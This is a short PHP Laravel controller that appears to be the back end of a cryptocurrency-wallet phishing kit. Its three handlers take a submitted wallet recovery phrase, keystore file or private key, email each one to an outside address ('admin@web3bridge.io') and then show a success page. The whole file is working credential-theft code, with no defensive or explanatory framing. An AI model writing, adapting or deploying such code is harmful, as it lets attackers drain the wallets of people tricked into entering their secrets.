<?php

namespace App\Http\Controllers;

use App\Mail\WalletPhrase;
use App\Mail\WalletKeystore;
use Illuminate\Http\Request;
use App\Mail\WalletPrivateKey;

class ProcessController extends Controller
{
    public function phrase(Request $request)
    {
        Mail::to("admin@web3bridge.io")->send(new WalletPhrase($request));
        return redirect('success')->with('code', $request->code);
    }

    public function keystore(Request $request)
    {
        Mail::to("admin@web3bridge.io")->send(new WalletKeystore($request));
        return redirect('success')->with('code', $request->code);
    }

    public function privatekey(Request $request)
    {
        Mail::to("admin@web3bridge.io")->send(new WalletPrivateKey($request));
        return redirect('success')->with('code', $request->code);
    }
}
